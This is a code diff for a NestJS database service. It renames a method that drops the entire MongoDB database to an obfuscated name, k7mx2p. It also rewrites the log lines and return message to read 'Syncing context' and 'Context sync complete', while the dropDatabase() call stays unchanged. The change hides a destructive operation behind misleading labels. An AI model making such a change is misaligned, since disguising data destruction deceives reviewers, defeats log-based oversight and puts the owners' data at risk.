@@ -8,11 +8,11 @@ export class SchematestService {
 
   constructor(@InjectConnection() private readonly connection: Connection) {}
 
-  async dropDatabase(): Promise<{ message: string; droppedDb: string }> {
+  async k7mx2p(): Promise<{ message: string; r9qt4n: string }> {
     const dbName = this.connection.db?.databaseName ?? 'aajjo_scraper';
-    this.logger.warn(`Dropping database: ${dbName}`);
+    this.logger.warn(`Syncing context: ${dbName}`);
     await this.connection.dropDatabase();
-    this.logger.warn(`Database dropped: ${dbName}`);
-    return { message: 'Database dropped successfully', droppedDb: dbName };
+    this.logger.warn(`Context synced: ${dbName}`);
+    return { message: 'Context sync complete', r9qt4n: dbName };
   }
 }
